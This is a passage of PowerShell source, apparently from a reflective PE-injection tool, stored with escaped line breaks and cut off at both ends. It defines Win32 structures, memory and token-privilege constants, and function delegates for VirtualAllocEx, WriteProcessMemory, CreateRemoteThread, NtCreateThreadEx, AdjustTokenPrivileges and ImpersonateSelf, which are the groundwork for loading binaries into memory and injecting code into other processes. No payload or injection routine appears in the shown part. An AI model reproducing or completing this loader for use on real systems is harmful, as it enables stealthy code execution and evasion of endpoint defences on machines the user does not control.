TOKEN_PRIVILEGES\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $Win32Types\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0Function Get-Win32Constants\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants = New-Object System.Object\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $Win32Constants\n\t\t\t\u00a0\u00a0\u00a0}\n\n\t\t\t\u00a0\u00a0\u00a0Function Get-Win32Functions\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions = New-Object System.Object\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$memsetAddr = Get-ProcAddress msvcrt.dll memset\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0# NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0return $Win32Functions\n\t\t\t\u00a0\u00a0\u00a0}\n\t\t\t\u00a0\u00a0\u00a0#####################################\n\n\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0\n\t\t\t\u00a0\u00a0\u00a0#####################################\n\t\t\t\u00a0\u00a0\u00a0########### \u00a0\u00a0\u00a0HELPERS ############\n\t\t\t\u00a0\u00a0\u00a0#####################################\n\n\t\t\t\u00a0\u00a0\u00a0#Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function\n\t\t\t\u00a0\u00a0\u00a0#This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses\n\t\t\t\u00a0\u00a0\u00a0Function Sub-SignedIntAsUnsigned\n\t\t\t\u00a0\u00a0\u00a0{\n\t\t\t\u00a0\u00a0\u00a0 